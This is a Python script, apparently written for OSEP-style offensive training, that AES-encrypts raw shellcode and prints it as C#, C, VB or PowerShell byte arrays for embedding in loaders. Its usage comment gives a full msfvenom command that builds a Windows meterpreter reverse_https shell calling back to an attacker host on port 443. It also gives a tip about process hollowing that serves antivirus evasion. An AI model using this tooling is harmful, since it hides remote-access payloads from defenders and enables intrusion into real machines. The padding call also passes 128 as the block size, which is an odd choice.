from Crypto.Cipher import AES
import binascii
from Crypto.Util.Padding import pad, unpad
import argparse

# Usage: 
#   msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 EXITFUNC=thread -f raw -o ~/OSEP/shell.raw
#   python aes-encode.py --key 777456789abcdety --format csharp --file shell.raw
#
#   ***** Note don't use msfvenom encoders with d/invoke process hollowing.  It crashes process right on startup!!! ***
#   Key size is 16 chars!  No More or less

def printAsCSharp(buf):
    valuesPerLine = 20
    linecount=0
    print(f"byte[] buf = new byte[{len(buf)}] {{ ")
    for c in buf:
        linecount +=1
        print("0x"+c.to_bytes(1, "little").hex()+",", end='')
        if (linecount % valuesPerLine == 0):
            linecount=0
            print("")
    print("};")

def printAsC(buf):
    valuesPerLine = 40
    linecount=0
    print(f"unsigned char buf[] = \"", end='')
    for c in buf:
        linecount +=1
        print(""+"\\x"+c.to_bytes(1, "little").hex(), end='')
        if (linecount % valuesPerLine == 0):
            linecount=0
            print("\"")
            print("\"", end='');
    print("\";")

def printAsVB(buf):
    valuesPerLine = 50
    linecount=0
    str = ""
    str += "buf = Array("
    for c in buf:
        linecount +=1
        str += "%d," % (c)
        if (linecount % valuesPerLine == 0):
            linecount=0
            str += " _\n"
    str = str[:-1] # remove last comma
    str += ")\n"
    print(str)

def printAsPS(buf):
    valuesPerLine = 40
    linecount=0
    print(f"[byte[]] $buf = ", end='')
    for c in buf:
        linecount +=1
        print(""+"0x"+c.to_bytes(1, "little").hex()+",", end='')
        if (linecount % valuesPerLine == 0):
            linecount=0
            print("")

def loadFile(fileName):
    with open(fileName, mode='rb') as file: # b is important -> binary
        fileContent = file.read()
    return fileContent

# Create the parser
parser = argparse.ArgumentParser()# Add an argument
parser.add_argument('--key', type=str, required=True)# Parse the argument
parser.add_argument('--format', type=str, required=True)# Parse the argument
parser.add_argument('--file', nargs='?', default="shell.raw", type=str, required=False)# Parse the argument

args = parser.parse_args()
cipher = AES.new(args.key.encode('utf8'), AES.MODE_ECB)
shellcodeFile = args.file
encoded = cipher.encrypt(pad(loadFile(shellcodeFile), 128))

if args.format.lower() == "vb": 
    printAsVB(encoded)
elif args.format.lower() == "ps":  
    printAsPS(encoded)
elif args.format.lower() == "csharp":
    printAsCSharp(encoded)
elif args.format.lower() == "c":
    printAsC(encoded)
